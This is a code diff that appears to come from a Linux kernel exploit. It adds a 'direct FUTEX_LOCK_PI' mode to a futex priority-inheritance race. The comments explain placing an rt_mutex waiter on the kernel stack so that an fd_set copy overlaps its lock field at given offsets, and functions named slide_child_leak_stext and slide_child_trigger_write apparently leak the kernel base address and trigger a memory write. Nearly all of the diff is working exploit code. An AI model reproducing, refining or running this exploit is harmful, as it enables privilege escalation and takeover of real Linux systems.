@@ -1945,10 +1945,12 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   pin_to_core(SLIDE_WAITER_CORE);
 #endif
 
+#if !(defined(SLIDE_DIRECT_LOCK_PI) && SLIDE_DIRECT_LOCK_PI)
   if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide waiter lock chain errno=%d\n", errno);
     return NULL;
   }
+#endif
 
   atomic_store(&slide_waiter_ready, 1);
   while (!atomic_load(&slide_owner_started)) {
@@ -1966,8 +1968,25 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
 
   atomic_store(&slide_waiter_waiting, 1);
   errno = 0;
+#if defined(SLIDE_DIRECT_LOCK_PI) && SLIDE_DIRECT_LOCK_PI
+  /*
+   * Direct FUTEX_LOCK_PI on the target futex: the owner already holds
+   * slide_f_pi_target and is not waiting on anything else, so the waiter
+   * blocks inside futex_lock_pi -> rt_mutex_slowlock with its
+   * rt_mutex_waiter a couple of stack frames shallower than the
+   * FUTEX_WAIT_REQUEUE_PI path.  The fd_set copy window (0x3c20..0x3c90
+   * with nfds=320) can then overlap the waiter's ->lock at +0x38/+0x58,
+   * which the REQUEUE path's 0x3c80 base never allowed (lock at 0x3cd8 =
+   * index 23 > 14).  NOTE: the waiter must NOT hold slide_f_pi_chain
+   * here, otherwise the PI chain sees a cycle (owner holds target and
+   * waits for chain) and FUTEX_LOCK_PI returns EDEADLK without blocking.
+   */
+  long wait_ret = futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, &timeout,
+                           NULL, 0);
+#else
   long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                            &slide_f_pi_target, 0);
+#endif
   int wait_errno = errno;
 #if !(defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE)
   pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno);
@@ -1978,6 +1997,14 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   }
   pr_info("slide pi stage=wait-timeout-accepted tid=%d\n", tid);
   atomic_store(&slide_waiter_ok, 1);
+#if defined(SLIDE_DIRECT_LOCK_PI) && SLIDE_DIRECT_LOCK_PI
+  /*
+   * No requeue/deadlock dance in direct mode: the block was a plain
+   * FUTEX_LOCK_PI that timed out.  Nothing is waiting for EDEADLK, so
+   * hand control to the writer immediately.
+   */
+  atomic_store(&slide_deadlock_seen, 1);
+#else
   while (!atomic_load(&slide_deadlock_seen)) {
     __asm__ volatile("yield" ::: "memory");
   }
@@ -1988,6 +2015,7 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
     return NULL;
   }
   pr_info("slide pi stage=waiter-unlock-return tid=%d\n", tid);
+#endif
   while (!atomic_load(&slide_owner_acquired)) {
     __asm__ volatile("yield" ::: "memory");
   }
@@ -2036,6 +2064,18 @@ void *slide_owner_thread(void *arg __attribute__((unused))) {
   }
 
   atomic_store(&slide_owner_started, 1);
+#if defined(SLIDE_DIRECT_LOCK_PI) && SLIDE_DIRECT_LOCK_PI
+  /*
+   * Direct mode: the owner holds slide_f_pi_target and must not wait on
+   * the chain while the waiter tries to lock the target, otherwise the PI
+   * chain is a cycle and FUTEX_LOCK_PI returns EDEADLK without blocking.
+   * Unlock nothing; just mark the owner as having acquired so the writer
+   * can proceed once the waiter's FUTEX_LOCK_PI times out.
+   */
+  pr_info("slide pi stage=owner-direct-hold tid=%d\n",
+          (int)syscall(SYS_gettid));
+  atomic_store(&slide_owner_acquired, 1);
+#else
   pr_info("slide pi stage=owner-chain-lock-enter tid=%d\n",
           (int)syscall(SYS_gettid));
   if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
@@ -2045,6 +2085,7 @@ void *slide_owner_thread(void *arg __attribute__((unused))) {
   atomic_store(&slide_owner_acquired, 1);
   pr_info("slide pi stage=owner-chain-lock-return tid=%d\n",
           (int)syscall(SYS_gettid));
+#endif
 
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
   while (!atomic_load(&slide_route_stop)) {
@@ -2143,6 +2184,20 @@ uint64_t slide_child_leak_stext(void) {
     usleep(SLIDE_REQUEUE_ARM_USEC);
   }
 
+#if defined(SLIDE_DIRECT_LOCK_PI) && SLIDE_DIRECT_LOCK_PI
+  /*
+   * Direct mode: the waiter is already blocked in FUTEX_LOCK_PI on
+   * slide_f_pi_target (held by the owner).  Wait for the timeout to fire
+   * so pi_blocked_on is live during the whole block, then release the
+   * waiter.
+   */
+  while (!atomic_load(&slide_waiter_ok)) {
+    usleep(1000);
+  }
+  atomic_store(&slide_deadlock_seen, 1);
+  pr_info("slide direct lock_pi timeout accepted waiter_tid=%d\n",
+          atomic_load(&slide_waiter_tid));
+#else
   long requeue_ret = 0;
   int requeue_errno = 0;
   int requeue_polls = 0;
@@ -2165,6 +2220,7 @@ uint64_t slide_child_leak_stext(void) {
     return 0;
   }
   atomic_store(&slide_deadlock_seen, 1);
+#endif
 
   while (!atomic_load(&slide_route_done)) {
     usleep(1000);
@@ -2196,6 +2252,19 @@ static int slide_child_trigger_write(void) {
   pr_info("slide pi stage=cmp-enter waiter_tid=%d\n",
           atomic_load(&slide_waiter_tid));
 
+#if defined(SLIDE_DIRECT_LOCK_PI) && SLIDE_DIRECT_LOCK_PI
+  /*
+   * Direct mode: waiter is blocked in FUTEX_LOCK_PI on slide_f_pi_target
+   * (held by owner).  Wait for its timeout, then let it proceed to the
+   * writer.
+   */
+  while (!atomic_load(&slide_waiter_ok)) {
+    usleep(1000);
+  }
+  atomic_store(&slide_deadlock_seen, 1);
+  pr_info("slide direct lock_pi timeout accepted waiter_tid=%d\n",
+          atomic_load(&slide_waiter_tid));
+#else
   long requeue_ret = 0;
   int requeue_errno = 0;
   int requeue_polls = 0;
@@ -2219,6 +2288,7 @@ static int slide_child_trigger_write(void) {
   }
   pr_info("slide pi stage=deadlock-accepted\n");
   atomic_store(&slide_deadlock_seen, 1);
+#endif
   while (!atomic_load(&slide_route_done)) {
     usleep(1000);
   }
